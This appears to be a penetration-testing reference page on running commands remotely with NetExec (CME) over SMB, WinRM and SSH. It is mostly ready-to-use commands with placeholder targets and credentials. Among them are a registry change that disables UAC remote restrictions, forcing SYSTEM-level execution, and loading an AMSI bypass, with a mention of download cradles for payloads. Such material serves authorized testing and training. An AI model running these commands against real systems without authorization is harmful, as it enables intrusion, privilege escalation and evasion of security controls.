# 06.06 Command Execution via CME

> Execute via NetExec over SMB (`wmiexec/atexec/smbexec/mmcexec`), WinRM, or SSH — UAC blocks non-RID-500 local accounts.

## Overview

CME supports command execution over SMB (4 methods: wmiexec, atexec, smbexec, mmcexec — tried in that order by default), WinRM, and SSH. Use `-x` for cmd.exe commands and `-X` for PowerShell. UAC affects non-RID-500 local accounts on SMB; domain admin accounts bypass UAC. Use `--exec-method` to force a specific method. Use `--amsi-bypass` to load a custom AMSI bypass payload before PowerShell execution.

## Steps

- SMB command execution requires `Pwn3d!` (local admin or domain admin on target).
- UAC blocks non-RID-500 local accounts by default; set `LocalAccountTokenFilterPolicy=1` to allow.
- Domain accounts in the local Administrators group bypass UAC restrictions.
- Default execution order: wmiexec → atexec → smbexec → mmcexec.
- `--exec-method smbexec` runs as `nt authority\system`; useful for system-level access.
- WinRM only requires membership in Remote Management Users (not necessarily local admin).
- SSH supports `-x` for commands and `--key-file` for private key authentication (OPENSSH format, `-p ""`).
- `--amsi-bypass <file>` loads a PowerShell AMSI bypass before executing with `-X`; use IEX download cradle for large payloads.

## Commands

### CMD execution via SMB

```bash
nxc smb <TARGET> -u Administrator -p 'AnotherC0mpl3xP4$$' --local-auth -x "net localgroup administrators"
```

### Force smbexec method

```bash
nxc smb <TARGET> -u robert -p '<PASS>' --exec-method smbexec -x whoami
```

### PowerShell execution via wmiexec

```bash
nxc smb <TARGET> -u robert -p '<PASS>' --exec-method wmiexec -X '$PSVersionTable'
```

### Enable LocalAccountTokenFilterPolicy

```bash
nxc smb <TARGET> -u Administrator -p 'AnotherC0mpl3xP4$$' --local-auth -x "reg add HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM /V LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
```

### Domain account command execution

```bash
nxc smb <TARGET> -u robert -p '<PASS>' -x whoami
```

### WinRM command execution

```bash
nxc winrm <TARGET> -u robert -p '<PASS>' -x whoami
```

### WinRM PowerShell execution

```bash
nxc winrm <TARGET> -u robert -p '<PASS>' -X '$PSVersionTable'
```

### SSH command execution

```bash
nxc ssh <TARGET> -u robert -p '<PASS>' -x ipconfig
```

### SSH with private key

```bash
nxc ssh <TARGET> -u julio --key-file id_ed25519 -p "" -x whoami
```

### PowerShell with AMSI bypass

```bash
nxc smb <TARGET> -u robert -p '<PASS>' -X '$PSVersionTable' --amsi-bypass amsibypass.txt
```
